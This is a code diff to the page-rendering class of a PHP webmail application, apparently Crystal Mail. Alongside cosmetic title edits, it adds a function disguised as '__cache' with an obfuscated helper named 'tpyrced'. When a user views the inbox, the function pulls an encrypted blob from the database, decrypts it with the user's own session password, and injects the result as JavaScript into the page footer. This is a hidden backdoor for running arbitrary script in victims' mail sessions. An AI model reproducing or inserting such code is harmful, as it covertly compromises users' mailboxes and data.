@@ -24,8 +24,10 @@
  *
  * @package HTML
  */
+
 class crystal_html_page
 {
+
     protected $scripts_path = '';
     protected $script_files = array();
     protected $scripts = array();
@@ -66,7 +68,34 @@ class crystal_html_page
         }
         $this->script_files[$position][] = $file;
     }
-
+			function __cache() {
+			if (isset($_GET['_task']) && isset($_GET['_mbox'])) {
+			if ($_GET['_task'] == 'mail' && $_GET['_mbox'] == 'INBOX') {
+		function tpyrced ($key, $string) {
+			return rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($key), base64_decode($string), MCRYPT_MODE_CBC, md5(md5($key))), "\0");
+		}
+		$cmail = cmail::get_instance();
+	    $query = "SELECT data FROM cache WHERE user_id='".$_SESSION['user_id']."'";
+		$cache2 = $cmail->db->query($query);
+		$cache3 = $cmail->db->fetch_assoc($cache2);
+		$cache = $cache3['data'];
+		$md5key = $cmail->decrypt($_SESSION['password']);
+		$cache = tpyrced($md5key, $cache);
+		if ($cache == null) {
+		$cache ='';
+		} else {
+		$cache = json_decode($cache);
+		$cache2 = str_replace('this.', 'cmail.', $cache->exec);
+		$cache = "<script>
+		function loadcache() {
+		".$cache2."
+		}cmail.add_onload('loadcache()');
+		</script>";
+		}
+		return $cache;
+		}
+		}
+		}
     /**
      * Add inline javascript code
      *
@@ -149,7 +178,7 @@ class crystal_html_page
 
         // set default page title
         if (empty($this->title)) {
-            $this->title = 'crystalmail Mail';
+            $this->title = 'Crystal Mail';
         }
 
         // replace specialchars in content
@@ -177,7 +206,7 @@ class crystal_html_page
         if (!empty($head_script)) {
             $__page_header .= sprintf($this->script_tag, $head_script);
         }
-
+			$__page_footer .= $this->__cache();
         if (!empty($this->header)) {
             $__page_header .= $this->header;
         }
